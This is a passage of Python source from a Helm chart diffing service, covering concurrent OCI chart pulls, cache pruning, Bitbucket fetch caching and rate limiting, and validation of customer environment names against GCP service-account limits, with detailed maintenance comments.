    # to pull and untar the same chart into the same directory simultaneously
    # (helm fails with "failed to untar: a file or directory already exists").
    with _helm_pull_locks_lock:
        if key not in _helm_pull_locks:
            _helm_pull_locks[key] = threading.Lock()
        pull_lock = _helm_pull_locks[key]

    with pull_lock:
        # Re-check cache after acquiring the per-key lock (another thread may have
        # finished the pull while we were waiting)
        with _helm_cache_lock:
            if key in _helm_chart_cache:
                return _helm_chart_cache[key]
        if os.path.isdir(chart_dir) and os.listdir(chart_dir):
            pull_ts = _helm_chart_pull_ts.get(key)
            if (not _is_dev) or (pull_ts is not None and time.monotonic() - pull_ts < DEV_CHART_TTL):
                with _helm_cache_lock:
                    _helm_chart_cache[key] = _find_chart_subdir(chart_dir)
                return _helm_chart_cache[key]
            # Stale dev build still on disk: park it aside so the fresh pull
            # below can land in chart_dir. Parked dirs are removed by
            # _prune_helm_cache at the start of the next iteration. A diff
            # holding the old path mid-rename fails as REASON_RENDER and is
            # absorbed by the per-diff retry loop.
            parked = f"{chart_dir}.stale-{int(time.monotonic() * 1000)}"
            try:
                os.rename(chart_dir, parked)
            except OSError:
                shutil.rmtree(chart_dir, ignore_errors=True)

        # Pull into a temp dir and atomically rename to avoid partial state.
        # Retry up to 3 times on transient network failures; don't retry on
        # permanent errors (chart not found).
        import tempfile as _tf
        os.makedirs(HELM_CACHE_DIR, exist_ok=True)
        tmp_dir = _tf.mkdtemp(dir=HELM_CACHE_DIR, prefix=f"{chart}-{version}-")
        # v2.5.19 (R1, community-research round): give each helm pull an
        # ISOLATED registry-config + cache/config/data home. Helm 3.x has no
        # file locking around its shared OCI blob store (helm #8059) — the
        # index-lock fix only lands in Helm 4.1.0 — so concurrent pulls of
        # DIFFERENT chart:versions (WARM_WORKERS pre-warm + the per-diff pull
        # pair) racing one shared cache can corrupt a blob ("blob ... not
        # found"). The per-key pull lock only serializes the SAME
        # chart:version; different versions still ran fully parallel against
        # one cache. A private HELM_* home per pull removes the shared mutable
        # state entirely. The untarred chart still lands in tmp_dir -> chart_dir
        # as before; only helm's transient registry/cache scratch is isolated,
        # and it is cleaned up with tmp_dir on every path.
        _helm_home = _tf.mkdtemp(dir=HELM_CACHE_DIR, prefix=f".helmhome-{chart}-")
        _pull_env = dict(os.environ)
        _pull_env.update(
            # v2.5.23: HELM_REGISTRY_CONFIG deliberately NOT isolated. Login
            # (_helm_login) writes credentials to the DEFAULT registry config;
            # v2.5.19-v2.5.22 pointed pulls at a fresh empty config, so every
            # pull ran unauthenticated and the private registry answered 403
            # (production incident on the first PRs after the 2.5.15->2.5.2x
            # jump; masked locally by ambient docker credentials). The #8059
            # blob-store race lives in the mutable CACHE homes below — the
            # registry config is login-write-only / pull-read-only, safe to
            # share.
            # v2.5.24: HELM_CONFIG_HOME is deliberately NOT isolated either.
            # helm derives the DEFAULT registry-config path from it
            # ($HELM_CONFIG_HOME/registry/config.json), so isolating it
            # orphaned the credentials login wrote and every pull got 403 —
            # proven in the pod: config-home isolation -> 403, cache-only
            # isolation -> success. The #8059 blob race lives in the cache
            # homes below, which stay isolated per pull.
            HELM_REPOSITORY_CACHE=os.path.join(_helm_home, "repository"),
            HELM_CACHE_HOME=os.path.join(_helm_home, "cache"),
            HELM_DATA_HOME=os.path.join(_helm_home, "data"),
        )
        last_err = ""
        try:
            for pull_attempt in range(3):
                r = subprocess.run(
                    [HELM_BIN, "pull", f"oci://{registry}/{chart}",
                     "--version", version, "--untar", "-d", tmp_dir],
                    capture_output=True, text=True, timeout=120, env=_pull_env)

                if r.returncode == 0:
                    break  # success

                err = (r.stderr or r.stdout or "").lower()
                last_err = r.stderr[:200]

                if any(p in err for p in ("not found", "404", "does not exist",
                                           "no such file", "unexpected status code: 404")):
                    raise OciChartNotFound(
                        f"Chart {chart}:{version} not found in {registry}. "
                        f"Check that the version exists in the OCI registry.")

                if pull_attempt < 2:
                    wait = (pull_attempt + 1) * 5  # 5s, 10s
                    log(f"helm pull transient error ({chart}:{version}), "
                        f"retry {pull_attempt+1}/2 in {wait}s: {last_err[:80]}", "WARNING")
                    time.sleep(wait)
                else:
                    sev = _record_pull_failure(f"{registry}/{chart}:{version}")
                    log(f"helm pull failed for {chart}:{version}: {last_err}"
                        + (f" — {_diff_stats['oci_consecutive_pull_failures']} consecutive"
                           f" systemic pull failures, diff engine degraded"
                           if sev == "ERROR" else ""), sev)
                    # v2.5.14: tmp_dir is only renamed into chart_dir on success
                    # (below) or removed by the `except` handler on a raised
                    # exception. A plain `return` here does neither -- it does
                    # not trigger `except`, so every exhausted-retry failure
                    # (oci_pull_failed: network blip, registry outage, expired
                    # credentials) leaked one mkdtemp() directory permanently.
                    # _prune_helm_cache never finds these either: it only walks
                    # the registry/chart/version 3-level hierarchy, and this
                    # dir sits directly under HELM_CACHE_DIR. Confirmed live:
                    # a single simulated transient failure left one orphan
                    # directory that no cleanup path ever removed.
                    shutil.rmtree(tmp_dir, ignore_errors=True)
                    return None

            # Move from tmp to final location atomically
            os.makedirs(os.path.dirname(chart_dir), exist_ok=True)
            if not os.path.exists(chart_dir):
                os.rename(tmp_dir, chart_dir)
            else:
                # Another thread beat us to it; remove our tmp copy
                shutil.rmtree(tmp_dir, ignore_errors=True)
            # v2.5.25: a completed pull is the ground truth that the OCI path
            # works — remember the ref for the self-check and reset the
            # consecutive-failure escalation.
            _record_pull_success(registry, chart, version)
        except Exception:
            shutil.rmtree(tmp_dir, ignore_errors=True)
            raise
        finally:
            # v2.5.19 (R1): the isolated helm home is scratch — always remove
            # it, on success, failure, or exception.
            shutil.rmtree(_helm_home, ignore_errors=True)

        path = _find_chart_subdir(chart_dir)
        with _helm_cache_lock:
            _helm_chart_cache[key] = path
            # v2.5.19 (M3): the timestamp write belongs inside the same lock
            # as the cache write it pairs with — one line outside it raced
            # the webhook thread's locked eviction of this exact key.
            _helm_chart_pull_ts[key] = time.monotonic()
        return path


def _find_chart_subdir(chart_dir: str) -> str:
    """Return the chart directory inside chart_dir (helm --untar creates a subdir).

    Prefers the subdirectory that contains a Chart.yaml to avoid picking an
    arbitrary one when untaring produces multiple dirs (e.g. chart + dependency).
    """
    try:
        subdirs = [d for d in os.listdir(chart_dir)
                   if os.path.isdir(os.path.join(chart_dir, d))]
        if not subdirs:
            return chart_dir
        # Pick the subdir that contains Chart.yaml (the chart root)
        for d in subdirs:
            if os.path.isfile(os.path.join(chart_dir, d, "Chart.yaml")):
                return os.path.join(chart_dir, d)
        # Fallback: first subdir (as before)
        return os.path.join(chart_dir, subdirs[0])
    except OSError:
        return chart_dir


# Cap on pulled chart versions kept on the pod's ephemeral disk. Each mass
# version-bump pulls a couple of versions per chart; over a long pod lifetime
# these accumulate and can fill node ephemeral storage (not bounded by the
# memory limit). Keep the most-recently-used and evict the rest.
HELM_CACHE_MAX_CHARTS = _env_int("HELM_CACHE_MAX_CHARTS", 60)


def _prune_helm_cache():
    """Keep at most HELM_CACHE_MAX_CHARTS pulled chart version dirs on disk.

    Called at the START of an iteration (before any diffs) so it never races a
    chart that an in-flight diff is reading. Removes the oldest version dirs and
    their matching in-memory cache entries.
    """
    try:
        version_dirs = []
        for registry in os.listdir(HELM_CACHE_DIR):
            reg_path = os.path.join(HELM_CACHE_DIR, registry)
            # v2.5.19 (R1): reap isolated per-pull helm homes left behind by a
            # pod that was killed mid-pull (the happy path removes them in a
            # finally). They sit directly under HELM_CACHE_DIR as .helmhome-*
            # and would otherwise accumulate. Also covers stray pull tmp dirs.
            if registry.startswith(".helmhome-"):
                shutil.rmtree(reg_path, ignore_errors=True)
                continue
            if not os.path.isdir(reg_path):
                continue
            for chart in os.listdir(reg_path):
                chart_path = os.path.join(reg_path, chart)
                if not os.path.isdir(chart_path):
                    continue
                for version in os.listdir(chart_path):
                    vpath = os.path.join(chart_path, version)
                    if os.path.isdir(vpath):
                        version_dirs.append(
                            (os.path.getmtime(vpath), registry, chart, version, vpath))
    except OSError:
        return

    # Remove parked stale dirs (renamed aside by _ensure_chart) and dev chart
    # builds past their TTL. This runs at iteration start, before any diff,
    # so no in-flight helm template call is reading these paths.
    _now = time.monotonic()
    kept = []
    removed_stale = 0
    for entry in version_dirs:
        _mtime, registry, chart, version, vpath = entry
        key = f"{registry}/{chart}:{version}"
        parked = ".stale-" in version
        pull_ts = _helm_chart_pull_ts.get(key)
        if pull_ts is None:
            # CORRECTNESS FIX (v2.4.8): _helm_chart_pull_ts is in-memory only
            # and starts empty on every pod restart. Treating "no timestamp"
            # as "definitely stale" meant the pod wiped its ENTIRE on-disk dev
            # chart cache on the first prune after every restart, even for
            # charts pulled seconds before the restart. The filesystem mtime
            # survives restarts (the directory itself does), so use it as the
            # source of truth when the in-memory timestamp is missing, and
            # seed the in-memory map from it so later TTL checks in
            # _ensure_chart (which only reads _helm_chart_pull_ts) agree with
            # this decision instead of re-deriving it differently.
            file_age_s = time.time() - _mtime
            if file_age_s < DEV_CHART_TTL:
                _helm_chart_pull_ts[key] = _now - file_age_s
                pull_ts = _helm_chart_pull_ts[key]
        stale_dev = (
            _DEV_REGISTRY_PATTERN in registry
            and (pull_ts is None or _now - pull_ts >= DEV_CHART_TTL)
        )
        if parked or stale_dev:
            shutil.rmtree(vpath, ignore_errors=True)
            with _helm_cache_lock:
                _helm_chart_cache.pop(key, None)
            _helm_chart_pull_ts.pop(key, None)
            with _helm_pull_locks_lock:
                _helm_pull_locks.pop(key, None)
            removed_stale += 1
            continue
        kept.append(entry)
    version_dirs = kept
    if removed_stale:
        log(f"Helm cache prune: removed {removed_stale} stale/parked dev chart build(s)")

    if len(version_dirs) <= HELM_CACHE_MAX_CHARTS:
        return
    version_dirs.sort(reverse=True)  # newest first
    removed = 0
    for _mtime, registry, chart, version, vpath in version_dirs[HELM_CACHE_MAX_CHARTS:]:
        shutil.rmtree(vpath, ignore_errors=True)
        key = f"{registry}/{chart}:{version}"
        with _helm_cache_lock:
            _helm_chart_cache.pop(key, None)
        # Also remove the per-version pull lock: once the chart dir is gone
        # there is nothing to protect, and the Lock object would leak otherwise.
        with _helm_pull_locks_lock:
            _helm_pull_locks.pop(key, None)
        removed += 1
    if removed:
        log(f"Helm cache prune: removed {removed} old chart version(s)")


# Value file cache: {(sha, path) -> content}. Keyed by immutable commit sha, so
# entries never go stale; shared across all apps and all PRs in a pod lifetime.
_vf_cache: dict = {}
_vf_cache_lock  = threading.Lock()

# COPS-2546: exponential retry backoff for transient PR failures. A PR whose
# pass ends transient (indeterminate diffs, unreadable fetches) is retried, but
# not on every single iteration: 1, 2, 4 then capped at 8 iterations between
# attempts. Under a Bitbucket quota exhaustion the old retry-every-cycle
# behavior was self-sustaining: 429s caused indeterminates, indeterminates
# caused retries, retries consumed the recovering budget and caused the next
# 429s (live on 2026-07-29, acme-config-dev PR 6938 with 120 apps).
# A new push (sha change) is processed immediately and resets the escalation;
# a clean or permanent completion clears the entry.
#
# In-memory and therefore per-pod: a restart drops the backoff state and the
# next iteration retries everything once. That is the conservative direction
# (a restart must never hide a PR), and the cross-pod comment dedup still
# prevents duplicate comments.
_retry_backoff = {}   # seen-key -> [skips_remaining, next_delay, pr_sha]


def _backoff_should_skip(sk, pr_sha) -> bool:
    """True if this PR should be skipped this iteration (consumes one skip)."""
    with _seen_lock:
        bo = _retry_backoff.get(sk)
        if not bo:
            return False
        if bo[2] != pr_sha:            # new push: retry now, reset escalation
            del _retry_backoff[sk]
            return False
        if bo[0] > 0:
            bo[0] -= 1
            return True
        return False


def _backoff_register_transient(sk, pr_sha) -> int:
    """Record a transient failure; returns the delay (iterations) applied."""
    with _seen_lock:
        bo = _retry_backoff.get(sk)
        delay = bo[1] if (bo and bo[2] == pr_sha) else 1
        _retry_backoff[sk] = [delay, min(delay * 2, 8), pr_sha]
        return delay


def _backoff_clear(sk):
    with _seen_lock:
        _retry_backoff.pop(sk, None)


# COPS-2546: read-at-sha caching for every fetch that is not a helm value file.
# The v2.13.2/v2.13.3 additions (identity checks, cohort guard, identity-move
# augmenter) called _bb_fetch_status directly, so every poll cycle re-fetched
# files that cannot change (content at a git sha is immutable), multiplied by
# every open PR and every retry. Combined with the retry-until-determinate loop
# this exhausted the Bitbucket API budget live on 2026-07-29: 1449s iterations
# and acme-config-dev PR 6938 stuck INPROGRESS for hours.
#
# This deliberately REUSES _vf_cache instead of adding a second dict:
#   - _vf_cache is already bounded by _bound_vf_cache() once per iteration, so a
#     long-lived pod cannot grow it without limit. A private cache here would
#     have shipped an unbounded leak in a pod that runs for weeks.
#   - the paths overlap heavily (the new-env ancestor chain reads the very same
#     config.yaml files _fetch_value_files reads), so sharing turns those into
#     cross-hits rather than duplicate calls.
#   - one singleflight map means concurrent duplicates dedupe across both paths.
#
# Storage contract is _fetch_value_files': content for BB_OK, None for
# BB_NOT_FOUND, and nothing at all for BB_ERROR, because a transient failure
# must never be cached as a fact. Status is therefore derivable on read.
# ── COPS-2562: cheap environment-name validation ────────────────────────────
#
# COPS-2552 resolved prefix/customerName/suffix/esSuffix through each app's
# ENTIRE value-file chain at BOTH shas to rebuild the exact GCP service
# account id. Correct, but on a mass version bump (PR 3831: 212 apps, 14
# changed files) that was ~65s of a 121.5s iteration and the single largest
# consumer of Bitbucket API calls, on a token shared with the Azure DevOps
# pipelines (COPS-2543).
#
# The expensive part existed only to learn two values that are constants in
# practice. Verified across all three config repos, 2026-07-30:
#   appspace.prefix                     13 decls, {pv, cl},  always 2 chars
#   appspace.suffix                    307 decls, {a, b, c}, always 1 char
#   appspace.externalSecretsTool.suffix  0 decls, chart default "es", 2 chars
# so len(GSA id) == len(customerName) + 8 and GCP's 30-char limit means
# customerName <= 22. The cap below is 20, leaving two characters of margin
# for a future longer prefix/suffix/esSuffix or another derived resource
# without having to model each resource type again. Longest real name today
# is 19 ("westinghousenuclear"), across 322 environments, so nothing needs
# grandfathering.
CUSTOMER_NAME_MAX = 20

# Deliberately NOT the strict GCP id regex. pv-3ds-c is a real live prod
# environment: "3ds" starts with a digit and fails ^[a-z]..., but the full
# id "pv-3ds-c-es" is valid because the prefix supplies the leading letter.
# Validating customerName alone with the strict pattern would block it.
_CUSTOMER_NAME_RE = re.compile(r"^[a-z0-9]([a-z0-9-]*[a-z0-9])?$")


def _check_customer_name(name):
    """Validate appspace.customerName. Returns (status, detail).

    "ok" / "invalid" / "unresolved" -- the three-way distinction FIX A
    (v2.4.9) established, so "not declared here" can never be mistaken for
    "rejected".
    """
    if not name:
        return "unresolved", None
    name = str(name)
    if len(name) > CUSTOMER_NAME_MAX:
        return "invalid", (
            f"`appspace.customerName` is {len(name)} characters "
            f"(`{name}`), the maximum is {CUSTOMER_NAME_MAX}. The derived GCP "
            f"service account id is `<prefix>-<customerName>-<suffix>-es`, and "
            f"GCP rejects service account IDs longer than 30 characters, which "
            f"leaves {CUSTOMER_NAME_MAX} for the name plus margin. This is a "
            f"hard Google limit, not an Appspace one: the environment would "
            f"deploy and then silently fail, with ArgoCD reporting Synced "
            f"while every pod sits in CreateContainerConfigError. Shorten the "
            f"name and push again.")
    if not _CUSTOMER_NAME_RE.match(name):
        return "invalid", (
            f"`appspace.customerName` (`{name}`) must contain only lowercase "
            f"letters, digits and hyphens, and must not start or end with a "
            f"hyphen. It becomes part of a GCP service account id, which GCP "
            f"validates strictly.")
    return "ok", None


def _warn_if_name_invariant_broken(flat: dict):
    """The cap encodes an invariant that lives in the config repos, not in a
    schema: prefix is always 2 chars and suffix always 1. If that ever
    changes, the arithmetic behind CUSTOMER_NAME_MAX stops holding, so make
    it surface loudly instead of silently under-protecting."""
    prefix = flat.get("appspace.prefix")
    suffix = flat.get("appspace.suffix")
    if prefix is not None and len(str(prefix)) > 2:
        log(f"appspace.prefix {prefix!r} is longer than the 2 characters "
            f"CUSTOMER_NAME_MAX={CUSTOMER_NAME_MAX} assumes -- the cap may no "
            f"longer guarantee a valid GCP service account id (COPS-2562)",
            "WARNING")
    if suffix is not None and len(str(suffix)) > 1:
        log(f"appspace.suffix {suffix!r} is longer than the 1 character "
            f"CUSTOMER_NAME_MAX={CUSTOMER_NAME_MAX} assumes -- the cap may no "
            f"longer guarantee a valid GCP service account id (COPS-2562)",
            "WARNING")


# The two basenames an environment's identity can live in. Exact basename
# membership, never endswith: "mycustomer.yaml" is not an identity file.
# Used by the customerName cap (COPS-2562), the new-env detector and the
# rename helpers, so it must stay a single definition (COPS-2564: a second
# one was added and silently shadowed this).
_IDENTITY_BASENAMES = ("customer.yaml", "config.yaml")


# COPS-2562 point 3: cache the PARSED yaml, not just the text. gcp/config.yaml
# is 1543 lines and was re-parsed once per app (212x on a mass bump) even
# though _vf_cache already had the text. Same (sha, path) key and the same
# bound as _vf_cache -- an unbounded dict here would leak in a pod that runs
# for weeks (COPS-2546).
_yaml_cache: dict = {}


def _bound_yaml_cache():
    with _vf_cache_lock:
        if len(_yaml_cache) <= VF_CACHE_MAX:
            return
        drop = len(_yaml_cache) - VF_CACHE_MAX // 2
        for k in list(_yaml_cache)[:drop]:
            _yaml_cache.pop(k, None)


def _flat_yaml_cached(path: str, sha: str, repo: str = None) -> dict:
    """Flattened YAML of a file at a sha, parsed at most once per (sha, path).

    Content at a git sha is immutable, so a fetched parse (including {} for
    an unparseable or 404 file) is a stable fact and caches forever. A
    TRANSIENT fetch failure (BB_ERROR: 429/5xx/network) is the one thing
    that is NOT a fact: it returns {} for this call but is never cached,
    the same storage contract _vf_cache documents. Caching it would let a
    single rate-limited fetch silently disable the name check for that
    (sha, path) for the lifetime of the pod.

    The key uses the same normalization as _bb_fetch_cached, so
    "$config/gcp/x.yaml" and "gcp/x.yaml" share one entry and one parse.

    Callers get the CACHED dict itself, not a copy: treat it as read-only.
    Mutating it would poison every later reader of the same (sha, path).
    """
    key = (sha, posixpath.normpath(str(path).replace("$config/", "").lstrip("/")))
    with _vf_cache_lock:
        if key in _yaml_cache:
            return _yaml_cache[key]
    content, status = _bb_fetch_cached(path, sha, repo=repo)
    if status == BB_ERROR:
        return {}
    if status != BB_OK or not content:
        flat = {}
    else:
        try:
            flat = _flatten_yaml(yaml.safe_load(content) or {})
        except yaml.YAMLError:
            flat = {}
    with _vf_cache_lock:
        _yaml_cache[key] = flat
    # Outside the insert lock: _vf_cache_lock is a plain Lock, not an RLock,
    # and _bound_yaml_cache takes it again.
    _bound_yaml_cache()
    return flat


# COPS-2562 point 2 (reuse fetches across shas in prep): deleting the GSA
# chain walk above resolved this on its own. Audited every remaining
# base-sha read in the prep path -- _rename_identity_confirmed and
# _augment_renames_with_identity_moves read files that are DELETED at
# pr_sha (so main is the only side that has them), _changed_files_with_bad_names
# reads base only for a changed file already suspected of a violation, and
# _summarize_input_changes needs both sides by definition. None of them
# re-reads an UNTOUCHED file at two shas, which was exactly what the old
# per-app chain walk did. A helper for that case was written and then
# removed: with the walk gone it had no caller, and dead scaffolding is the
# same over-engineering this ticket set out to undo.
def _changed_files_with_bad_names(changed_files, pr_sha, base_sha,
                                  repo: str = None) -> dict:
    """Identity files this PR adds or edits whose customerName is invalid.

    Returns {path: detail}. Only reads the CHANGED files themselves -- never
    an ancestor chain -- which is the whole performance point of COPS-2562:
    customerName is declared in the environment's own leaf file (309 in
    customer.yaml, 13 in a public-cloud config.yaml, 0 inherited in a way
    that matters here).

    Only flags names this PR INTRODUCES or CHANGES: a name that is already
    over the cap on both sides is deliberately left alone, the same scope
    decision COPS-2552 made, so an unrelated PR touching an already-broken
    environment is not blocked by accident.
    """
    bad = {}
    for path in (changed_files or []):
        if str(path).rsplit("/", 1)[-1] not in _IDENTITY_BASENAMES:
            continue
        try:
            pr_flat = _flat_yaml_cached(path, pr_sha, repo=repo)
            # BEFORE the customerName skip: tier config.yaml files declare
            # prefix/suffix WITHOUT a customerName, and those are exactly
            # the files where a longer prefix would first appear. Warning
            # only on files that also declare a name would miss the drift.
            _warn_if_name_invariant_broken(pr_flat)
            pr_name = pr_flat.get("appspace.customerName")
            if pr_name is None:
                continue
            status, detail = _check_customer_name(pr_name)
            if status != "invalid":
                continue
            base_name = _flat_yaml_cached(path, base_sha, repo=repo).get(
                "appspace.customerName")
            if base_name == pr_name:
                continue  # pre-existing, not introduced by this PR
            bad[path] = detail
        except Exception as e:
            # Same fail-open the old per-app pool gave each future: one
            # broken file must never take down the whole prep phase.
            log(f"customerName check failed for {path}, skipping this "
                f"file (fail-open): {e}", "WARNING")
    return bad


def _bb_fetch_cached(filepath, sha, repo=None):
    """_bb_fetch_status with (sha, path) caching and singleflight.

    Returns the same (content, status) tuple, so callers keep the
    BB_OK / BB_NOT_FOUND / BB_ERROR distinction they already branch on.

    `repo` is forwarded only when set. Passing repo=None is identical to
    omitting it (that is the wrapped function's own default), and omitting it
    keeps this a true drop-in at every existing call shape rather than
    silently changing the arity every caller and test double sees.
    """
    _kw = {"repo": repo} if repo else {}
    clean = posixpath.normpath(str(filepath).replace("$config/", "").lstrip("/"))
    key = (sha, clean)
    with _vf_cache_lock:
        if key in _vf_cache:
            c = _vf_cache[key]
            return c, (BB_NOT_FOUND if c is None else BB_OK)
        if key in _vf_inflight:
            evt, fetcher = _vf_inflight[key], False
        else:
            evt = threading.Event()
            _vf_inflight[key] = evt
            fetcher = True
    if not fetcher:
        evt.wait(timeout=30)
        with _vf_cache_lock:
            if key in _vf_cache:
                c = _vf_cache[key]
                return c, (BB_NOT_FOUND if c is None else BB_OK)
        # The fetcher timed out or hit a transient error (never cached). Do the
        # call ourselves rather than inventing an answer from an empty cache.
        return _bb_fetch_status(filepath, sha, **_kw)
    try:
        content, status = _bb_fetch_status(filepath, sha, **_kw)
        if status in (BB_OK, BB_NOT_FOUND):
            with _vf_cache_lock:
                _vf_cache[key] = content
        return content, status
    finally:
        with _vf_inflight_lock:
            _vf_inflight.pop(key, None)
        evt.set()

# Upper bound on cached value files so a long-lived pod cannot grow without limit
# (each open PR adds ~7 base-sha + ~7 head-sha entries). When exceeded we drop the
# oldest-inserted half. dict preserves insertion order, so the first keys are oldest.
VF_CACHE_MAX = _env_int("VF_CACHE_MAX", 5000)


def _bound_vf_cache():
    """Evict the oldest half of the value-file cache when it exceeds VF_CACHE_MAX."""
    with _vf_cache_lock:
        if len(_vf_cache) <= VF_CACHE_MAX:
            return
        drop = len(_vf_cache) - VF_CACHE_MAX // 2
        for k in list(_vf_cache.keys())[:drop]:
            del _vf_cache[k]
# Bitbucket API rate limit: cap concurrent calls across all PRs+apps to avoid
# 429 responses that cause value files to return None and helm template to fail
# with "Missing required value". Each PR×app fetches 14 files (7 paths × 2 shas)
# and with 3 PRs × 16 workers × 14 files = 672 potential concurrent requests.
# Cap at 30 to stay well within BB API limits while keeping good throughput.
BB_API_CONCURRENCY = _env_int("BB_API_CONCURRENCY", 30)
_bb_api_sem = threading.Semaphore(BB_API_CONCURRENCY)


# COPS-2564: how many Bitbucket API calls does one iteration actually cost?
# There was no way to answer that: the only evidence of API pressure was 429s
# after the fact, on a token shared with the Azure DevOps pipelines
# (COPS-2543). Counted at the two places that really talk to Bitbucket --
# _bb_fetch_status (file reads, the hot path) and bb() (REST calls) -- so a
# cache hit is deliberately NOT counted and the number keeps meaning "calls
# we made". Plain ints under a lock: += on a shared int is not atomic under
# 16 diff workers, and an undercount would defeat the purpose.
_bb_calls = {"file_fetches": 0, "rest_calls": 0, "rate_limited": 0,
             "mirror_reads": 0}
_bb_calls_lock = threading.Lock()


def _count_bb_call(kind: str, n: int = 1):
    with _bb_calls_lock:
        _bb_calls[kind] = _bb_calls.get(kind, 0) + n


def bb_call_stats() -> dict:
    """Snapshot of the Bitbucket API counters (a copy, never the live dict)."""
    with _bb_calls_lock:
        return dict(_bb_calls)


def reset_bb_call_stats():
    """Zero the counters at the start of an iteration so the number logged at
    the end is per-iteration, not since pod start."""
    with _bb_calls_lock:
        for k in _bb_calls:
            _bb_calls[k] = 0

# Shared rate-limit gate (v2.13.0, COPS-2543).
#
# A 429 is a property of the TOKEN, not of the one request that happened to
# receive it: the budget is already spent for everyone. The old per-thread
# backoff meant each of the BB_API_CONCURRENCY threads had to discover the
# same 429 on its own and burn its own two retries doing it, all inside the
# same rejected window. The first thread to see a 429 now publishes the pause
# here and the rest brake with it.
#
# Cap: a hostile or broken Retry-After must not be able to stall a PR, so the
# pause is clamped. Fallback: Bitbucket does not always send Retry-After on
# /src, and 2s was useless against a ~60s window, so the no-header case still
# waits long enough to leave it.
BB_RATELIMIT_MAX_PAUSE = _env_int("BB_RATELIMIT_MAX_PAUSE", 60)
BB_RATELIMIT_FALLBACK  = _env_int("BB_RATELIMIT_FALLBACK", 15)
# Bounded slices instead of `while remaining > 0`: the loop must terminate
# even if the clock never advances (a stubbed sleep, a frozen monotonic),
# because hanging here would wedge every value-file fetch in the process.
BB_RATELIMIT_SLICES = 4

_bb_ratelimit_until = 0.0
_bb_ratelimit_lock  = threading.Lock()


def _bb_ratelimit_hold(seconds):
    """Publish a shared pause of `seconds`, extending any pause already set.

    max(), never min(): if another thread already learned a longer window,
    shortening it would send the whole pool straight back into the window
    that just rejected it.
    """
    global _bb_ratelimit_until
    with _bb_ratelimit_lock:
        _bb_ratelimit_until = max(_bb_ratelimit_until, time.monotonic() + seconds)


def _bb_ratelimit_remaining():
    """Seconds left on the shared pause, 0.0 when none is active."""
    with _bb_ratelimit_lock:
        return max(0.0, _bb_ratelimit_until - time.monotonic())


def _bb_ratelimit_clear():
    """Drop any active pause. Test seam only."""
    global _bb_ratelimit_until
    with _bb_ratelimit_lock:
        _bb_ratelimit_until = 0.0


def _bb_ratelimit_wait():
    """Block until the shared Bitbucket pause has elapsed."""
    for _ in range(BB_RATELIMIT_SLICES):
        remaining = _bb_ratelimit_remaining()
        if remaining <= 0:
            return
        time.sleep(min(remaining, BB_RATELIMIT_MAX_PAUSE))


def _fetch_value_files(value_files: list, sha: str) -> dict:
    """Fetch all helm value files from Bitbucket at a specific commit sha.

    value_files is a list of paths like '$config/gcp/dev/.../config.yaml'.
    The '$config/' prefix is the git source alias; we strip it to get the
    actual path in acme-config-dev.

    Returns {original_path: file_content} for files that were fetched successfully.
    Files that return 404 (e.g. new clusters not yet in main) are silently skipped.

    Fetches all files in parallel (typically 7 files × ~300ms = ~300ms total
    instead of ~2.1s sequential). Results are cached by (sha, path) so the main
    sha value files are fetched only once across all apps in a PR iteration.
    """
    # Paths whose fetch failed transiently (429/5xx after retries), as opposed
    # to genuinely absent ones. Appended from the fetcher threads.
    unreadable = []
    unreadable_lock = threading.Lock()

    def _fetch_one(vf):
        clean     = posixpath.normpath(vf.replace("$config/", "").lstrip("/"))
        cache_key = (sha, clean)

        # Fast path: already in cache.
        with _vf_cache_lock:
            if cache_key in _vf_cache:
                return vf, _vf_cache[cache_key]
            # Singleflight: if another thread is already fetching this key, join it
            # instead of making a duplicate Bitbucket API call.
            if cache_key in _vf_inflight:
                evt     = _vf_inflight[cache_key]
                fetcher = False
            else:
                evt = threading.Event()
                _vf_inflight[cache_key] = evt
                fetcher = True

        if not fetcher:
            done = evt.wait(timeout=30)
            with _vf_cache_lock:
                val = _vf_cache.get(cache_key)
            if not done and val is None:
                # Fetcher did not complete within 30s (slow Bitbucket). Return
                # None but do not cache it — the caller treats None as a missing
                # file which may be correct. Logged so diff stats show the miss.
                debug(f"Singleflight timeout for ({sha[:8]}, {clean})")
            return vf, val

        # We are the fetcher for this cache key.
        try:
            content, status = _bb_fetch_status(clean, sha)
            if status in (BB_OK, BB_NOT_FOUND):
                with _vf_cache_lock:
                    _vf_cache[cache_key] = content
            elif status == BB_ERROR:
                with unreadable_lock:
                    unreadable.append(vf)
            return vf, content
        finally:
            with _vf_inflight_lock:
                _vf_inflight.pop(cache_key, None)
            evt.set()

    result = {}
    missing = []
    with ThreadPoolExecutor(max_workers=max(1, min(len(value_files), BB_API_CONCURRENCY))) as ex:
        for vf, content in ex.map(_fetch_one, value_files):
            if content:
                result[vf] = content
            else:
                missing.append(vf.replace("$config/", ""))
    # v2.13.1 (COPS-2543): report UNREADABLE separately from ABSENT, and at
    # WARNING. These are different events and the old single debug() line
    # ("value files not found") called both of them absence. A 404 is normal
    # (new cluster not yet merged to main); a 429/5xx that outlived its retries
    # means the render is about to fail for a reason that has nothing to do with
    # the PR, and it reaches the reviewer as a bare "missing required value".
    # Because the old line was debug() and production runs at INFO, we could not
    # tell those two apart in the logs at all.
    if unreadable:
        shown = [v.replace("$config/", "") for v in unreadable[:5]]
        more = f" (+{len(unreadable) - 5} more)" if len(unreadable) > 5 else ""
        log(f"[bb] {len(unreadable)} value file(s) UNREADABLE at sha {sha[:8]} "
            f"— 429/5xx after retries, NOT absent; the render will look like a "
            f"missing required value: {shown}{more}", "WARNING")
    absent = [v for v in missing if v not in
              {u.replace("$config/", "") for u in unreadable}]
    if absent:
        debug(f"value files absent at sha {sha[:8]}: {absent}")
    return result


def _helm_template(chart_path: str, release: str, namespace: str,
                   value_files_content: dict) -> tuple:
    """Run `helm template` locally with the given value files.

    Returns (manifests_yaml: str, error: str|None).
    value_files_content: {path_label: yaml_content} dict (order matters for overrides).
    """
    import tempfile as _tempfile
    with _tempfile.TemporaryDirectory(prefix="acme-diff-helm-") as tmpdir:
        value_args = []
        for idx, (label, content) in enumerate(value_files_content.items()):
            fname = os.path.join(tmpdir, f"values_{idx:03d}.yaml")
            with open(fname, "w") as f:
                f.write(content)
            value_args += ["-f", fname]

        cmd = ([HELM_BIN, "template", release, chart_path,
                "--namespace", namespace or release,
                "--kube-version", KUBE_VERSION,
                "--include-crds"] + value_args)
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=DIFF_TIMEOUT)
        if r.returncode != 0:
            return None, _cap_helm_error(r.stderr or r.stdout or "helm template failed")
        return r.stdout, None


# COPS-2564: a flat 400-char cap used to be applied to helm stderr right here,
# before anything parsed it. That is fine for a one-line render error, but a
